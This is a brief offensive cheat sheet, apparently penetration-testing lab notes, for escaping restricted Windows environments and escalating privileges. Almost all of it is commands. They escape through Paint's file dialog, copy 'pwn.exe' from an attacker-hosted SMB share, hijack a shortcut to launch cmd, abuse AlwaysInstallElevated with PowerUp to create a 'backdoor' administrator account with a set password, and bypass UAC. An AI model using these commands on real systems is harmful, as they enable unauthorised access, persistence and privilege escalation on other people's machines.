# Escape with Paint
```powershell
Save --> Open

\\127.0.0.1\c$\users\pmorgan
```

# Accessing SMB share from restricted environment
```powershell
smbserver.py -smb2support share $(pwd)

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\10.13.38.95\share"
net use Z: \\10.13.38.95\share

Copy-Item "\\10.13.38.95\share\pwn.exe" -Destination "C:\Users\pmorgan\Desktop\"

Explorer++
```

# Alternate Registry Editors
```powershell

```

# Modify existing shortcut file
```powershell
Shortcut Programs --> Rights --> Rights Click --> Target ( C:\Windows\System32\cmd.exe )
```

# Script Execution
```powershell
BAT:
@echo off
cmd.exe

VBS:
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe", 1, True

PS1:
Start-Process cmd.exe
```

# Escalation Privileges
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1

powershell -ep bypass
Import-Module .\PowerUp.ps1
Write-UserAddMSI

backdoor:T3st@123

runas /user:backdoor cmd
```

# Bypassing UAC
```powershell
powershell -ep bypass
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```
